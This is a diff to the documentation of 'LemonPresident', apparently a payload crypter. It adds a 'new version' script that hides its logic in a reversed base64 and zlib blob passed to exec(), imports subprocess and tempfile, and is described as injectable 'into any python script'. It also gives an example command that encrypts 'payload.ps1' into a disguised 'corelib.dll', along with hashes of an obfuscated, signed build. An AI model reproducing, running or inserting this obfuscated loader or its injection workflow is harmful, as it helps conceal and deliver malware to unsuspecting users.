@@ -9,13 +9,23 @@ cipherfile2.py and actual encryption framework sourced from https://github.com/B
 Official SHA256 hash for the obfuscated LemonPresident build: c8f2cc4862975b405c1ecf43f4a1dff63304ec8f09e850b6f1a7496112109e83
 Official SHA256 hash for the obfuscated LemonPresident build before I signed it: 6ece8313f1442058e473bc998ee9dbadabe47320e90835c21f8528265c0e71a9
 
-You should probably use the new version rather than old, since it's much more secure
+You should probably use the new version rather than old, since it's much more secure because it used ChaCha20-Poly1305 rather than a custom algorithm
 
 Example encryption command with the new encryption script: python encrypt.py payload.ps1 corelib.dll "bean"
 
 Inject LemonPresident into any python script ✅
 
+The new version
 
+import os
+import subprocess
+import tempfile
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gIVaC0B83F2cPURyIV5uKGAVGkjNiXpwYClNjHzUPra5I0p0RV4lKGh99Y29j/mw0wPiB9s6hn1sZ7ExvbiC2wQmSDjP5k3MpteDgILz4OKN/RrRVIP8b2vQpsayef6+ueTHY8yqwssS9f0uoL0WTaYJlMHV6GuDDG0heEcXzSKiJot9IepPxeg0xCAf+QMFBTUPusWcsuwx7TFHf6yKRkSqyUE7VRpiiMRoMtl6VP5FE3Cgk7ErwSNjjHA2LI/Da8UtBTVwFY9q+zDbSD1abfzLA5p8d0qnM02pv7w6J1tna9OuNzVaNsNNdeCGPfToaBWIFyUE5vBtTydvlXVObkknZGTFiC14vK2QNNpoZYk4V4xGfpuxVxVFoOQ/hRi1ItnlOJjLw6VW0PIFOmopT9WdT0q1PJggUrK5T9Q5813jU7dqUqgkpbyuluCyW5ZfxkVrAlOKZcPs6s3YpbBCbWU7Vl065rfQ3Dx1Tvl5B9AEQH3F2jzGoLPqF71w/rcQx2O3Ae3xyI5wtN2cstGxXrCQIsqwSx2vzP3bTw8V9hrSkguXTCdb1Hu3GW72X8sd7HuyNe6RyVho9Pm286yX/m28WrSoCq0eXJipN5Ai8Cvs/uyydX9Om+/XjYRf15XeRtdt25nF8cgnr8XvIyl3BaRUqyuub3CcXBy7LF3v72nXu4GKxisTFlfRHdnts0WbVN908T8XRLRkLZ9jn1bD51WVJGWJ1mYFfE6mT1My+17wQk2No1RXrk+0jzvO3oIGk+HqbyaXOs97X93QChWSsSrzOUG+isSOMSZnUTuMYwD1dK0elBJjOuveffUAz2r11UNyJe'))
+
+Old version
 
 import hmac
 import hashlib
